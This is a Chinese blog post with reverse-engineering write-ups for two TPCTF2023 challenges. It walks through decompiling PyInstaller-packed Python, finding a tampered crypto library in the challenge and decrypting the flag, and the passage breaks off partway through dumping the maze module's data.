<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>CTF-WP-4 | hahbiubiubiu</title><meta name="keywords" content="Reverse,CTF"><meta name="author" content="hahbiubiubiu"><meta name="copyright" content="hahbiubiubiu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="TPCTF2023nanPyEncpyinstxtractor.py可以轻松解压。 注意：猜测是不同python版本的原因导致不会解压PYZ archive python3.10下： ​	 python3.8下：  123456789101112131415161718192021222324252627282930313233343536373839404142434445# Source Ge">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF-WP-4">
<meta property="og:url" content="http://hahbiubiubiu.github.io/2023/12/24/CTF-wp-4/index.html">
<meta property="og:site_name" content="hahbiubiubiu">
<meta property="og:description" content="TPCTF2023nanPyEncpyinstxtractor.py可以轻松解压。 注意：猜测是不同python版本的原因导致不会解压PYZ archive python3.10下： ​	 python3.8下：  123456789101112131415161718192021222324252627282930313233343536373839404142434445# Source Ge">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://hahbiubiubiu.github.io/img/preview.jpg">
<meta property="article:published_time" content="2023-12-24T06:15:07.043Z">
<meta property="article:modified_time" content="2023-12-24T06:22:11.587Z">
<meta property="article:author" content="hahbiubiubiu">
<meta property="article:tag" content="Reverse">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://hahbiubiubiu.github.io/img/preview.jpg"><link rel="shortcut icon" href="/./img/Valkyrie.jpg"><link rel="canonical" href="http://hahbiubiubiu.github.io/2023/12/24/CTF-wp-4/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":100},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CTF-WP-4',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-12-24 14:22:11'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/./img/Valkyrie.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa fa-sitemap"></i><span> 站点</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="https://0x3.com"><i class="fa-fw fa fa-paper-plane"></i><span> 我的导航</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.bilibili.com/"><i class="fa-fw fa fa fa-window-restore"></i><span> BilBil</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/./img/preview.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">hahbiubiubiu</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa fa-sitemap"></i><span> 站点</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="https://0x3.com"><i class="fa-fw fa fa-paper-plane"></i><span> 我的导航</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.bilibili.com/"><i class="fa-fw fa fa fa-window-restore"></i><span> BilBil</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CTF-WP-4</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-24T06:15:07.043Z" title="发表于 2023-12-24 14:15:07">2023-12-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-24T06:22:11.587Z" title="更新于 2023-12-24 14:22:11">2023-12-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Reverse/">Reverse</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CTF-WP-4"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="TPCTF2023"><a href="#TPCTF2023" class="headerlink" title="TPCTF2023"></a>TPCTF2023</h1><h2 id="nanPyEnc"><a href="#nanPyEnc" class="headerlink" title="nanPyEnc"></a>nanPyEnc</h2><p><code>pyinstxtractor.py</code>可以轻松解压。</p>
<p><strong>注意：猜测是不同python版本的原因导致不会解压<code>PYZ archive</code></strong></p>
<p><code>python3.10</code>下：</p>
<p>​	<img src="/2023/12/24/CTF-wp-4/image-20231213211058916.png"></p>
<p><code>python3.8</code>下：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231213211126069.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: run.pyc (Python 3.8)</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> key, enc</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line">key = key.encode()</span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&#x27;Enter your message: &#x27;</span>).strip()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> message.startswith(<span class="string">&#x27;TPCTF&#123;&#x27;</span>) <span class="keyword">or</span> message.endswith(<span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line">    <span class="keyword">raise</span> AssertionError</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_message</span>(<span class="params">key = <span class="literal">None</span>, message = <span class="literal">None</span></span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    ciphertext = cipher.encrypt(pad(message, AES.block_size))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">encrypted = <span class="built_in">list</span>(encrypt_message(key, message.encode()))</span><br><span class="line"><span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(encrypted, enc):</span><br><span class="line">    <span class="keyword">if</span> x != y:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Wrong!&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Right!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: secret.pyc (Python 3.8)</span></span><br><span class="line">key = <span class="string">&#x27;2033-05-18_03:33&#x27;</span></span><br><span class="line">enc = [</span><br><span class="line">    <span class="number">213</span>,</span><br><span class="line">    <span class="number">231</span>,</span><br><span class="line">    <span class="number">201</span>,</span><br><span class="line">    <span class="number">213</span>,</span><br><span class="line">    <span class="number">9</span>,</span><br><span class="line">    <span class="number">197</span>,</span><br><span class="line">    <span class="number">233</span>,</span><br><span class="line">    <span class="number">81</span>,</span><br><span class="line">    <span class="number">111</span>,</span><br><span class="line">    <span class="number">223</span>,</span><br><span class="line">    <span class="number">34</span>,</span><br><span class="line">    <span class="number">166</span>,</span><br><span class="line">    <span class="number">103</span>,</span><br><span class="line">    <span class="number">225</span>,</span><br><span class="line">    <span class="number">175</span>,</span><br><span class="line">    <span class="number">180</span>]</span><br></pre></td></tr></table></figure>

<p>这里解出来的FLAG是错误的。</p>
<p>猜测是导入的变量又被其他导入覆盖了：<code>from Crypto.Util.number import *</code></p>
<p>在<code>Crypto.Util.number</code>中末尾有：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> time.time() % <span class="number">64</span> &lt; <span class="number">1</span>:</span><br><span class="line">    enc = (<span class="number">153</span>, <span class="number">240</span>, <span class="number">237</span>, <span class="number">199</span>, <span class="number">63</span>, <span class="number">44</span>, <span class="number">237</span>, <span class="number">45</span>, <span class="number">25</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">154</span>, <span class="number">158</span>, <span class="number">112</span>, <span class="number">46</span>, <span class="number">176</span>, <span class="number">219</span>, <span class="number">247</span>, <span class="number">44</span>, <span class="number">115</span>, <span class="number">169</span>, <span class="number">124</span>, <span class="number">64</span>, <span class="number">63</span>, <span class="number">121</span>, <span class="number">253</span>, <span class="number">250</span>, <span class="number">137</span>, <span class="number">34</span>, <span class="number">144</span>, <span class="number">33</span>, <span class="number">17</span>, <span class="number">182</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">247</span>, <span class="number">249</span>, <span class="number">41</span>, <span class="number">165</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">231</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">126</span>, <span class="number">30</span>, <span class="number">124</span>, <span class="number">237</span>)</span><br></pre></td></tr></table></figure>

<p>解出来的FLAG还是不对。</p>
<p>再看<code>Crypto.Util.number</code>导入的<code>from Crypto.Util.py3compat import *</code></p>
<p>在<code>from Crypto.Util.py3compat import *</code>中有：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">list</span>(<span class="params">s</span>):</span><br><span class="line">        _x = time.time() % <span class="number">64</span> &lt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">lambda</span> <span class="number">.0</span> = <span class="literal">None</span>: [ _x ^ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="number">.0</span> ])(s)</span><br></pre></td></tr></table></figure>

<p>这个条件和<code>Crypto.Util.number</code>的相同，因此大概是了。</p>
<p>改变了的地方：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231214105252998.png"></p>
<p>进行操作解FLAG</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">153</span>, <span class="number">240</span>, <span class="number">237</span>, <span class="number">199</span>, <span class="number">63</span>, <span class="number">44</span>, <span class="number">237</span>, <span class="number">45</span>, <span class="number">25</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">154</span>, <span class="number">158</span>, <span class="number">112</span>, <span class="number">46</span>, <span class="number">176</span>, <span class="number">219</span>, <span class="number">247</span>, <span class="number">44</span>, <span class="number">115</span>, <span class="number">169</span>, <span class="number">124</span>, <span class="number">64</span>, <span class="number">63</span>, <span class="number">121</span>, <span class="number">253</span>, <span class="number">250</span>, <span class="number">137</span>, <span class="number">34</span>, <span class="number">144</span>, <span class="number">33</span>, <span class="number">17</span>, <span class="number">182</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">247</span>, <span class="number">249</span>, <span class="number">41</span>, <span class="number">165</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">231</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">126</span>, <span class="number">30</span>, <span class="number">124</span>, <span class="number">237</span>]</span><br><span class="line">enc = <span class="built_in">bytes</span>([x ^ <span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> enc])</span><br><span class="line">key = <span class="string">b&#x27;2033-05-18_03:33&#x27;</span></span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag = aes.decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2><p>👉<a target="_blank" rel="noopener" href="https://www.ctfiot.com/149063.html">从TPCTF 2023 学习Python逆向</a></p>
<h3 id="解压可执行文件"><a href="#解压可执行文件" class="headerlink" title="解压可执行文件"></a>解压可执行文件</h3><p><code>pyinstxtractor.py</code>可以解压。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: chal.pyc (Python 3.8)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> maze <span class="keyword">import</span> run</span><br><span class="line">run()</span><br></pre></td></tr></table></figure>

<p>逻辑都在<code>maze</code>中，是一个<code>.so</code>文件。</p>
<p>用<code>help</code>看看<code>maze</code>里有什么：（好像需要同版本的python）</p>
<p>变量名是<code>base64</code>编码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">import maze</span><br><span class="line">help(maze)</span><br><span class="line">--------------------------------------------------------------------</span><br><span class="line">Help on module maze:</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">    maze</span><br><span class="line"></span><br><span class="line">CLASSES</span><br><span class="line">    builtins.object</span><br><span class="line">        Q2Fy</span><br><span class="line">        Q2VsbA</span><br><span class="line">        TWF6ZUxhbmc</span><br><span class="line">    </span><br><span class="line">    class Q2Fy(builtins.object)  # Car</span><br><span class="line">     |  Q2Fy(value, x, y)</span><br><span class="line">     |  </span><br><span class="line">     |  Methods defined here:</span><br><span class="line">     |  </span><br><span class="line">     |  __init__(self, value, x, y)</span><br><span class="line">     |  </span><br><span class="line">     |  __repr__(self)</span><br><span class="line">     |  </span><br><span class="line">     |  ----------------------------------------------------------------------</span><br><span class="line">     |  Data descriptors defined here:</span><br><span class="line">     |  </span><br><span class="line">     |  __dict__</span><br><span class="line">     |      dictionary for instance variables (if defined)</span><br><span class="line">     |  </span><br><span class="line">     |  __weakref__</span><br><span class="line">     |      list of weak references to the object (if defined)</span><br><span class="line">    </span><br><span class="line">    class Q2VsbA(builtins.object)  # Cell</span><br><span class="line">     |  Q2VsbA(name, value)</span><br><span class="line">     |  </span><br><span class="line">     |  Methods defined here:</span><br><span class="line">     |  </span><br><span class="line">     |  __init__(self, name, value)</span><br><span class="line">     |  </span><br><span class="line">     |  __repr__(self)</span><br><span class="line">     |  </span><br><span class="line">     |  ----------------------------------------------------------------------</span><br><span class="line">     |  Data descriptors defined here:</span><br><span class="line">     |  </span><br><span class="line">     |  __dict__</span><br><span class="line">     |      dictionary for instance variables (if defined)</span><br><span class="line">     |  </span><br><span class="line">     |  __weakref__</span><br><span class="line">     |      list of weak references to the object (if defined)</span><br><span class="line">    </span><br><span class="line">    class TWF6ZUxhbmc(builtins.object)  # MazeLang</span><br><span class="line">     |  TWF6ZUxhbmc(code)  # MazeLang</span><br><span class="line">     |  </span><br><span class="line">     |  Methods defined here:</span><br><span class="line">     |  </span><br><span class="line">     |  YWRkX2NlbGw(self, code)  # add_cell</span><br><span class="line">     |  </span><br><span class="line">     |  YWRkX2Z1bmN0aW9u(self, code)  # add_function</span><br><span class="line">     |  </span><br><span class="line">     |  Z2V0X2NlbGw(self, code)  # get_cell</span><br><span class="line">     |  </span><br><span class="line">     |  Z2V0X3Bvcw(self, pos, direction)  # get_pos</span><br><span class="line">     |  </span><br><span class="line">     |  __init__(self, code)</span><br><span class="line">     |  </span><br><span class="line">     |  aW5pdA(self)  # init</span><br><span class="line">     |  </span><br><span class="line">     |  b3Bw(self, direction)  # opp</span><br><span class="line">     |   </span><br><span class="line">     |  c3RlcA(self)  # step</span><br><span class="line">     |  </span><br><span class="line">     |  cnVuX3RpbGxfb3V0cHV0(self)  # run_till_output</span><br><span class="line">     |  </span><br><span class="line">     |  ----------------------------------------------------------------------</span><br><span class="line">     |  Data descriptors defined here:</span><br><span class="line">     |  </span><br><span class="line">     |  __dict__</span><br><span class="line">     |      dictionary for instance variables (if defined)</span><br><span class="line">     |  </span><br><span class="line">     |  __weakref__</span><br><span class="line">     |      list of weak references to the object (if defined)</span><br><span class="line"></span><br><span class="line">FUNCTIONS</span><br><span class="line">    aW5pdF9zZWNyZXQ()  # init_secret</span><br><span class="line">    </span><br><span class="line">    c29sdmU(SvL6VEBRwx) -&gt; &#x27;int&#x27;  # solve</span><br><span class="line">    </span><br><span class="line">    exit(status=None, /)</span><br><span class="line">        Exit the interpreter by raising SystemExit(status).</span><br><span class="line">        </span><br><span class="line">        If the status is omitted or None, it defaults to zero (i.e., success).</span><br><span class="line">        If the status is an integer, it will be used as the system exit status.</span><br><span class="line">        If it is another kind of object, it will be printed and the system</span><br><span class="line">        exit status will be one (i.e., failure).</span><br><span class="line">    </span><br><span class="line">    run()</span><br><span class="line"></span><br><span class="line">DATA</span><br><span class="line">    EqdU3uQNCi = [18, 17, 15, 0, 27, 31, 10, 19, 14, 21, 25, 22, 6, 3, 30,...</span><br><span class="line">    UJ9mxXxeoS = &#x27;IyMgIyMgIyMgIyMgIyMgIyMgIyMKIyMgIyMgIyMgXl4gIyMg...gLT4g...</span><br><span class="line">    __test__ = &#123;&#125;</span><br><span class="line">    c2VjcmV0 = [7, 47, 60, 28, 39, 11, 23, 5, 49, 49, 26, 11, 63, 4, 9, 2,...  # secret</span><br><span class="line">    regexes = &#123;&#x27;direction&#x27;: &#x27;%[LRUDNlrudn]&#x27;, &#x27;function&#x27;: &#x27;[A-Za-z][A-Za-z0...</span><br><span class="line"></span><br><span class="line">FILE</span><br><span class="line">    /home/biu/Desktop/maze_extracted/maze.so</span><br></pre></td></tr></table></figure>

<p>把<code>DATA</code>打印出来：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import maze</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; maze.EqdU3uQNCi</span></span><br><span class="line">[18, 17, 15, 0, 27, 31, 10, 19, 14, 21, 25, 22, 6, 3, 30, 8, 24, 5, 7, 4, 13, 29, 9, 26, 1, 2, 28, 16, 20, 32, 12, 23, 11]</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; maze.UJ9mxXxeoS</span></span><br><span class="line">&#x27;IyMgIyMgIyMgIyMgIyMgIyMgIyMKIyMgIyMgIyMgXl4gIyMgXl4gIyMKIyMgIyMgIyMgLi4gIyMgSVogIyMgIyMgIyMgIyMKIyMgJVIgLi4gJUQgIyMgJUQgLi4gLi4gJUwgIyMKIyMgPj4gIyMgLi4gIyMgRUEgKiogUFAgJVUgIyMKIyMgJVUgSUEgVEEgIyMgRUIgKiogUFAgJVUgIyMKIyMgJVUgSUIgVEIgIyMgRUMgKiogUFAgJVUgIyMKIyMgJVUgSUMgVEMgIyMgRUQgKiogUFAgJVUgIyMKIyMgJVUgSUQgVEQgIyMgRUUgKiogUFAgJVUgIyMKIyMgJVUgSUUgVEUgIyMgRUYgKiogUFAgJVUgIyMKIyMgJVUgSUYgVEYgIyMgJVIgKiogSVogJVUgIyMKIyMgJVUgSUcgJUwgIyMgIyMgIyMgIyMgIyMgIyMKIyMgIyMgIyMgIyMgIyMgIyMKClBQIC0+ICs9MQpNTSAtPiAtPTEKSVogLT4gPTAKRUEgLT4gSUYgPT0wIFRIRU4gJVIgRUxTRSAlRApFQiAtPiBJRiA9PTEgVEhFTiAlUiBFTFNFICVECkVDIC0+IElGID09MiBUSEVOICVSIEVMU0UgJUQKRUQgLT4gSUYgPT0zIFRIRU4gJVIgRUxTRSAlRApFRSAtPiBJRiA9PTQgVEhFTiAlUiBFTFNFICVECkVGIC0+IElGID09NSBUSEVOICVSIEVMU0UgJUQKVEEgLT4gSUYgKiogVEhFTiAlTCBFTFNFICVECklBIC0+ID03MgpUQiAtPiBJRiAqKiBUSEVOICVMIEVMU0UgJUQKSUIgLT4gPTczClRDIC0+IElGICoqIFRIRU4gJUwgRUxTRSAlRApJQyAtPiA9ODQKVEQgLT4gSUYgKiogVEhFTiAlTCBFTFNFICVECklEIC0+ID04MApURSAtPiBJRiAqKiBUSEVOICVMIEVMU0UgJUQKSUUgLT4gPTY3ClRGIC0+IElGICoqIFRIRU4gJUwgRUxTRSAlRApJRiAtPiA9ODQKSUcgLT4gPTcwCkxUIC0+IElGID09NiBUSEVOICVEIEVMU0UgJUwK&#x27;</span><br><span class="line"><span class="meta 